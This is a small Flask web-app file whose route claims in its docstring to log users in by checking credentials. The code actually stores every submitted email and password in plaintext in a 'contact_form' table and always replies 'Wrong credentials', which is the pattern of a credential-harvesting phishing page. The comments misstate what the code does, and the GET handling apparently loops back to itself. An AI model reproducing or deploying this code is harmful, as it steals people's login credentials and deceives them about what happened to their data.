# imports methods and objects from flask 
from email.mime import message
from flask import render_template, request, redirect, url_for, flash

from config.database import get_db_connection

from app import app

# create a route for the home page
@app.route('/', methods=['GET', "POST"])
def index():
    """handles user login process
    for Get request it renders the login page 
    For POST it attempts to log the user in by checking the email and password against the database
     If the login is successful it redirects the user to the user dashboard
     If the login fails it flashes an error message and redirects back to the login page
    """
    if request.method == 'POST':
        # get the form data
        email = request.form.get('email')
        password = request.form.get('password')

        # connect to the database
        conn = get_db_connection()
        cursor = conn.cursor()

        # insert the form data into the database
        cursor.execute('INSERT INTO contact_form (email, password) VALUES (%s, %s)',
                       (email, password))
        conn.commit()

        # close the database connection
        cursor.close()
        conn.close()

        flash('Wrong credentials. Please try again.', 'error')
    return redirect(url_for('index'))


@app.route('/user_dashboard', methods=['GET'])
def user_dashboard():
    """render the user_dashboard.html
    """
    return render_template('user_dashboard.html')